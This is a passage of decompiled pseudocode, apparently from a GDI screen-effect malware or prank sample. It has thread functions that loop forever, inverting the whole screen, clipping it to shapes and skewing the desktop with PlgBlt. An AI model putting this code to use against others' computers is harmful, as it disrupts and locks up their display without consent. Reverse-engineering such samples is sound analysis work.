        v21 = v17 / 0x1E + 1;
        do
        {
          RectRgn = CreateRectRgn(v18, v18 + v16, v4, v4 + v16);
          SelectClipRgn(DC, RectRgn);
          BitBlt(DC, 0, 0, v22, cy, DC, 0, 0, 0x330008u);
          Sleep(1u);
          v4 += 30;
          v18 = v25 - 30;
          v15 = v21-- == 1;
          v25 -= 30;
        }
        while ( !v15 );
      }
    }
    else if ( v10 > 0 )
    {
      v24 = v4;
      v11 = v6 - v4;
      v12 = v10 - 1;
      v13 = v4;
      v20 = v12 / 0x1E + 1;
      do
      {
        EllipticRgn = CreateEllipticRgn(v13, v11 + v13, v4, v11 + v4);
        SelectClipRgn(DC, EllipticRgn);
        BitBlt(DC, 0, 0, v22, cy, DC, 0, 0, 0x330008u);
        Sleep(1u);
        v4 += 30;
        v13 = v24 - 30;
        v15 = v20-- == 1;
        v24 -= 30;
      }
      while ( !v15 );
    }
    Sleep(1u);
    SystemMetrics = v22;
  }
}

void __stdcall __noreturn sub_403370(LPVOID lpThreadParameter)
{
  HDC DC; // esi
  void (__stdcall *v2)(HWND, LPRECT); // ebx
  HWND (__stdcall *v3)(); // ecx
  unsigned __int64 v4; // rax
  HWND v5; // eax
  bool v6; // zf
  HWND v7; // eax
  int v8; // [esp+10h] [ebp-30h]
  int v9; // [esp+10h] [ebp-30h]
  struct tagRECT Rect; // [esp+14h] [ebp-2Ch] BYREF
  POINT Point; // [esp+24h] [ebp-1Ch] BYREF
  int v12; // [esp+2Ch] [ebp-14h]
  int v13; // [esp+30h] [ebp-10h]
  int v14; // [esp+34h] [ebp-Ch]
  int v15; // [esp+38h] [ebp-8h]

  GetSystemMetrics(0);
  GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    v2 = (void (__stdcall *)(HWND, LPRECT))GetWindowRect;
    v3 = GetDesktopWindow;
    v4 = __rdtsc();
    if ( (v4 & 1) != 0 )
    {
      v9 = 30;
      do
      {
        v7 = v3();
        v2(v7, &Rect);
        Point.x = Rect.left - 90;
        Point.y = Rect.top + 90;
        v12 = Rect.right - 90;
        v13 = Rect.top - 90;
        v14 = Rect.left + 90;
        v15 = Rect.bottom + 90;
        PlgBlt(DC, &Point, DC, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
        v6 = v9-- == 1;
        v2 = (void (__stdcall *)(HWND, LPRECT))GetWindowRect;
        v3 = GetDesktopWindow;
      }
      while ( !v6 );
    }
    else
    {
      v8 = 30;
      do
      {
        v5 = v3();
        v2(v5, &Rect);
        Point.x = Rect.left + 90;
        Point.y = Rect.top - 90;
        v12 = Rect.right + 90;
        v13 = Rect.top + 90;
        v14 = Rect.left - 90;
        v15 = Rect.bottom - 90;
        PlgBlt(DC, &Point, DC, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
        v6 = v8-- == 1;
        v2 = (void (__stdcall *)(HWND, LPRECT))GetWindowRect;
        v3 = GetDesktopWindow;
      }
      while ( !v6 );
    }
  }
}

void __stdcall __noreturn sub_4035D0(LPVOID lpThreadParameter)
{
  int SystemMetrics; // edi
  int v2; // ebx
  HDC i; // esi

  SystemMetrics = GetSystemMetrics(0);
  v2 = GetSystemMetrics(1);
  for ( i = GetDC(0); ; BitBlt(i, 0, 0, SystemMetrics, v2, i, 0, 0, 0x330008u) )
    ;
}